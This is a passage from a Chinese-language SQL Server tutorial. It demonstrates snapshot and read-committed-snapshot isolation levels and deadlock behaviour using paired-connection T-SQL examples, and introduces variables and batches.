<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection A</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">    <span class="keyword">SET</span> unitprice = unitprice + <span class="number">1.00</span></span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="50.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step3. 在 Connection B 中运行以下代码，设置隔离级别为<code>SNAPSHOT</code>，并查询产品 2 的价格：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">SNAPSHOT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时的返回结果如下所示，可以看到这个结果是在该事务启动时可用的最后提交的版本。</p>
<figure class="image-box">
                <img src="51.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step4. 回到 Connection A 提交这一修改的行：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Step5. 在 Connection B 中运行以下代码，再次读取数据，然后提交事务：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后我们会得到跟之前一样的结果，奇了个怪了：</p>
<figure class="image-box">
                <img src="52.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;但是如果我们再次在 Connection B 中运行以下完整语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时结果便会同步，这个事务开始时可用的上一个提交的版本是价格 = 20.00</p>
<figure class="image-box">
                <img src="53.png" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;为什么两个事务得到结果会不同？这是因为快照清理线程每隔一分钟运行一次，现在由于没有事务需要为价格 = 20.00 的那个行版本了，所以清理线程下一次运行时会将这个行版本从<code>tempdb</code>数据库中删除掉。</p>
<p>&emsp;&emsp;最后，为了下一次演示，清理测试数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Clear Test Data</span></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line"><span class="keyword">SET</span> unitprice = <span class="number">19.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;这一隔离级别使用的不是共享锁，而是行版本控制。如前所述，不论修改操作（主要是更新和删除数据）是否在某种基于快照的隔离级别下的会话执行，快照隔离级别都会带来性能上的开销。</p>
</blockquote>
<p>&emsp;&emsp;另外，在<code>SNAPSHOT</code>快照级别下，可以通过检查的行版本，检测出更新冲突。它能判断出在快照事务的一次读操作和一次写操作之间是否有其他事务修改过数据。如果 SQL Server 检测到在读取和写入操作之间有另一个事务修改了数据，则会让事务因失败而终止，并返回以下错误信息：</p>
<figure class="image-box">
                <img src="54.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;冲突检测完整实例如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">-- Conflict Detection 冲突检测实例</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Connection A, Step 1</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">SNAPSHOT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Connection A, Step 2</span></span><br><span class="line">  <span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">    <span class="keyword">SET</span> unitprice = <span class="number">20.00</span></span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Cleanup</span></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">  <span class="keyword">SET</span> unitprice = <span class="number">19.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Connection A, Step 1</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Connection B, Step 1</span></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">  <span class="keyword">SET</span> unitprice = <span class="number">25.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Connection A, Step 2</span></span><br><span class="line">  <span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">    <span class="keyword">SET</span> unitprice = <span class="number">20.00</span></span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Cleanup</span></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">  <span class="keyword">SET</span> unitprice = <span class="number">19.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Close all connections</span></span><br></pre></td></tr></table></figure>

<h3 id="READ-COMMITED-SNAPSHOT-已经提交读隔离"><a href="#READ-COMMITED-SNAPSHOT-已经提交读隔离" class="headerlink" title="READ COMMITED SNAPSHOT 已经提交读隔离"></a>READ COMMITED SNAPSHOT 已经提交读隔离</h3><p>&emsp;&emsp;已提交读隔离也是基于行版本控制，但与快照不同之处在于：在已提交读级别下，读操作读取的数据行不是食物启动之前最后提交的版本，而是语句启动前最后提交的版本。<br>&emsp;&emsp;此外，该级别不会像快照隔离级别一样进行更新冲突检测。这样一来，它就跟 SQL Server 默认的<code>READ COMMITED</code>级别非常类似了，只不过<strong>读操作不用获得共享锁，当请求的资源被其他事务的排它锁锁定时，也不用等待</strong>。</p>
<p>&emsp;&emsp;下面继续通过案例来模拟：<br>&emsp;&emsp;Step1. 运行以下代码，设置隔离级别：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Turn on READ_COMMITTED_SNAPSHOT</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> TSQLFundamentals2008 <span class="keyword">SET</span> READ_COMMITTED_SNAPSHOT <span class="keyword">ON</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行该查询需要一定的时间，并且要注意：要成功运行，当前连接必须是指定数据库的唯一连接，请关掉其他连接，只保留一个会话来执行。<br>&emsp;&emsp;可以看到它跟我们之前设置隔离级别所使用的的语句不同，这个选项其实就是把默认的<code>READ COMMITED</code>的寒意变成了<code>READ COMMITED SNAPSHOT</code>。意味着打开这个选项时，除非显式地修改会话的隔离级别，否则<code>READ COMMITED SNAPSHOT</code>将成为默认的隔离级别。</p>
<p>&emsp;&emsp;Step2. 在 Connection A 中运行以下代码，更新产品 2 所在的行记录，再读取这一行记录，并且一直保持事务打开：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection A</span></span><br><span class="line"><span class="keyword">USE</span> TSQLFundamentals2008;</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">    <span class="keyword">SET</span> unitprice = unitprice + <span class="number">1.00</span></span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="55.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step3. 在 Connection B 中读取产品 2 所在的行记录，并一直保持事务打开：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection B</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;得到的结果是语句启动之前最后提交的版本（19.00）：</p>
<figure class="image-box">
                <img src="56.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step4. 回到 Connection A，提交事务：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Step5. 回到 Connection B，再次读取产品 2 所在的行，并提交事务：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时结果如下，可以看到跟<code>SNAPSHOT</code>不同，这次的结果是在语句执行之前最后提交的版本而不是事务执行之前最后提交的版本，因此得到了 20.00：</p>
<figure class="image-box">
                <img src="57.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;回想一下，这种现象是不是我们常听见的<strong>不可重复读</strong>？也就是说，该级别下，无法防止不可重复读问题。</p>
</blockquote>
<p>&emsp;&emsp;最后，按照国际惯例，清理测试数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Clear Test Data</span></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line"><span class="keyword">SET</span> unitprice = <span class="number">19.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，关闭所有连接，然后在一个新的连接下运行以下代码，以禁用指定数据库的基于快照的隔离级别：（执行<code>ALTER DATABASE TSQLFundamentals2008 SET READ_COMMITTED_SNAPSHOT OFF;</code>这一句时可能需要花费一点时间，请耐心等候）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Make sure you're back in default mode</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">READ</span> COMMITTED;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Change database options to default</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> TSQLFundamentals2008 <span class="keyword">SET</span> ALLOW_SNAPSHOT_ISOLATION <span class="keyword">OFF</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> TSQLFundamentals2008 <span class="keyword">SET</span> READ_COMMITTED_SNAPSHOT <span class="keyword">OFF</span>;</span><br></pre></td></tr></table></figure>

<h3 id="隔离级别总结"><a href="#隔离级别总结" class="headerlink" title="隔离级别总结"></a>隔离级别总结</h3><p>&emsp;&emsp;下表总结了每种隔离级别能够解决各种逻辑一致性的问题，以及隔离级别是否会检测更新冲突，是否使用了行版本控制。</p>
<figure class="image-box">
                <img src="58.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="59.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这时再回顾以下各个问题的描述及结果，我们来看另一个表：</p>
<figure class="image-box">
                <img src="60.png" alt title class>
                <p></p>
            </figure>

<h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><h3 id="死锁是个什么鬼？"><a href="#死锁是个什么鬼？" class="headerlink" title="死锁是个什么鬼？"></a>死锁是个什么鬼？</h3><p>&emsp;&emsp;死锁是指一种<strong>进程之间互相永久阻塞的状态</strong>，可能涉及到两个或者多个进程。两个进程发生死锁的例子是：进程 A 阻塞了进程 B，进程 B 又阻塞了进程 A。在任何一种情况下，SQL Server 都可以检测到死锁，并选择终止其中一个事务以干预死锁状态。如果 SQL Server 不干预，那么死锁涉及到的进程将会永远保持死锁状态。</p>
<figure class="image-box">
                <img src="61.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;默认情况下，SQL Server 会选择终止做过的操作最少的事务，因为这样可以让回滚开销降低到最低。当然，在 SQL Server 2005 及之后的版本中，可以通过将会话选项<code>DEADLOCK_PRIORITY</code>设置为范围（-10 到 10）之间的任一整数值。</p>
<h3 id="死锁实例"><a href="#死锁实例" class="headerlink" title="死锁实例"></a>死锁实例</h3><p>&emsp;&emsp;仍然打开三个会话：Connection A、B 和 C：<br>&emsp;&emsp;Step1. 在 Connection A 中更新 Products 表中产品 2 的行记录，并保持事务一直打开：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection A</span></span><br><span class="line"><span class="keyword">USE</span> TSQLFundamentals2008;</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">    <span class="keyword">SET</span> unitprice = unitprice + <span class="number">1.00</span></span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时 Connection A 对产品表的产品 2 请求了排它锁。</p>
<p>&emsp;&emsp;Step2. 在 Connection B 中更新 OrderDetails 表中产品 2 的订单明细，并保持事务一直打开：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection 2</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">UPDATE</span> Sales.OrderDetails</span><br><span class="line">    <span class="keyword">SET</span> unitprice = unitprice + <span class="number">1.00</span></span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时 Connection A 对订单明细表的产品 2 请求了排它锁。</p>
<p>&emsp;&emsp;Step3. 回到 Connection A 中，执行以下语句，请求查询产品 2 的订单明细记录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection A</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> orderid, productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Sales.OrderDetails</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;由于此时实在默认的<code>READ COMMITED</code>隔离级别下运行的，所以 Connection A 中的事务需要一个共享锁才能读数据，因此这里会一直阻塞住。但是，此时并没有发生死锁，而只是发生了阻塞。</p>
<p>&emsp;&emsp;Step4. 回到 Connection B 中，执行以下语句，尝试在 Products 表查询产品 2 的记录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection 2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里由于这个请求和 Connection A 中的事务在同一个资源上持有的排它锁发生了冲突，于是相互阻塞发生了死锁。SQL Server 通常会在几秒钟之内检测到死锁，并从这两个进程中选择一个作为牺牲品，终止其事务。所以我们还是得到了以下结果：</p>
<figure class="image-box">
                <img src="62.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step5. 刚刚提到了 SQL Server 会选择一个作为牺牲品，我们回到 Connection A 会看到以下的错误信息提示：</p>
<figure class="image-box">
                <img src="63.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在这个例子中，由于两个事务进行的工作量差不多一样，所以任何一个事务都有可能被终止。（前面提到，如果没有手动设置优先级，那么 SQL Server 会选择工作量较小的一个事务作为牺牲品）另外，解除死锁需要一定的系统开销，因为这个过程会涉及撤销已经执行过的处理。</p>
<blockquote>
<p>&emsp;&emsp;显然，事务处理的时间越长，持有锁的时间也就越长，死锁的可能性也就越大。应该尽量<strong>保持事务简短</strong>，把逻辑上可以属于同一工作单元的操作移到事务之外。</p>
</blockquote>
<h3 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h3><p>（1）<strong>改变访问资源的顺序可以避免死锁</strong><br>&emsp;&emsp;继续上面的例子，Connection A 先访问 Products 表中的行，然后访问 OrderDetails 表中的行；Connection B 先访问 OrderDetails 表中的行，然后访问 Products 表中的行。<br>&emsp;&emsp;这时如果我们改变一下访问顺序：两个事务按照同样的顺序来访问资源，则不会发生这种类型的死锁。</p>
<blockquote>
<p>&emsp;&emsp;通过交换其中一个事务的操作顺序，就可以避免发生这种类型的死锁（假设交换顺序不必改变程序的逻辑）。</p>
</blockquote>
<p>（2）<strong>良好的索引设计也可以避免死锁</strong><br>&emsp;&emsp;如果查询筛选条件缺少良好的索引支持，也会造成死锁。例如，假设 Connection B 中的事务有两条语句要对产品 5 进行筛选，Connection A 中的事务要对产品 2 进行处理，那么他们就不应该有任何冲突。但是，如果在表的 productid 列上如果没有索引来支持查询筛选，那么 SQL Server 就必须扫描（并锁定）表中的所有行，这样当然会导致死锁。</p>
<blockquote>
<p>&emsp;&emsp;总之，良好的索引设计将有助于减少这种没有真正的逻辑冲突的死锁。</p>
</blockquote>
<p>&emsp;&emsp;最后，按照国际惯例清理掉测试数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Cleanup</span></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">  <span class="keyword">SET</span> unitprice = <span class="number">19.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> Sales.OrderDetails</span><br><span class="line">  <span class="keyword">SET</span> unitprice = <span class="number">19.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span></span><br><span class="line">  <span class="keyword">AND</span> orderid &gt;= <span class="number">10500</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> Sales.OrderDetails</span><br><span class="line">  <span class="keyword">SET</span> unitprice = <span class="number">15.20</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span></span><br><span class="line">  <span class="keyword">AND</span> orderid &lt; <span class="number">10500</span>;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="可编程对象"><a href="#可编程对象" class="headerlink" title="可编程对象"></a>可编程对象</h1><h2 id="变量与批处理"><a href="#变量与批处理" class="headerlink" title="变量与批处理"></a>变量与批处理</h2><p>（1）变量：<code>DECLARE</code>+<code>SET</code>/<code>SELECT</code><br>&emsp;&emsp;<code>DECLARE</code>语句可以声明一个或多个变量，然后使用<code>SET</code>/<code>SELECT</code>语句可以把一个变量设置成指定的值。<br>&emsp;&emsp;① <code>SET</code>语句每次只能针对一个变量进行操作</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--set方式</span></span><br><span class="line"><span class="keyword">declare</span> @i <span class="keyword">as</span> <span class="built_in">int</span></span><br><span class="line"><span class="keyword">set</span> @i=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--SQL Server 2008可以在同一语句同时声明和初始化变量</span></span><br><span class="line"><span class="keyword">declare</span> @i <span class="keyword">as</span> <span class="built_in">int</span> = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② <code>SELECT</code>语句允许从同一行中获得的多个值分配给多个变量。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--select方式</span></span><br><span class="line"><span class="keyword">declare</span> @firstname <span class="keyword">as</span> <span class="keyword">nvarchar</span>(<span class="number">20</span>), @lastname <span class="keyword">as</span> <span class="keyword">nvarchar</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">  @firstname = firstname,</span><br><span class="line">  @lastname = lastname</span><br><span class="line"><span class="keyword">from</span> hr.Employees</span><br><span class="line"><span class="keyword">where</span> empid=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @firstname <span class="keyword">as</span> firstname, @lastname <span class="keyword">as</span> lastname;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>SET</code>语句比复制<code>SELECT</code>语句更加安全，因为它要求使用标量子查询来从表中提取数据。如果在运行时，标量子查询返回了多个值，则查询会失败。例如下面的代码在运行时会报错：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--set比select语句更安全</span></span><br><span class="line"><span class="keyword">declare</span> @empname <span class="keyword">as</span> <span class="keyword">nvarchar</span>(<span class="number">61</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> @empname = (<span class="keyword">select</span> firstname + N<span class="string">' '</span>+ lastname</span><br><span class="line">                <span class="keyword">from</span> hr.Employees</span><br><span class="line">                <span class="keyword">where</span> mgrid=<span class="number">2</span>);</span><br><span class="line">                </span><br><span class="line"><span class="keyword">select</span> @empname <span class="keyword">as</span> empname;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="64.png" alt title class>
                <p></p>
            </figure>

<p>（2）批处理<br>&emsp;&emsp;客户端应用程序发送到 SQL Server 的一组单条或多条 T-SQL 语句，SQL Server 将批处理语句作为单个可执行的单元。</p>
<figure class="image-box">
                <img src="65.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;下面是一个批处理的示例，但要注意的是如果批处理中存在语法错误，整个批处理是不会提交到 SQL Server 执行的。</p>
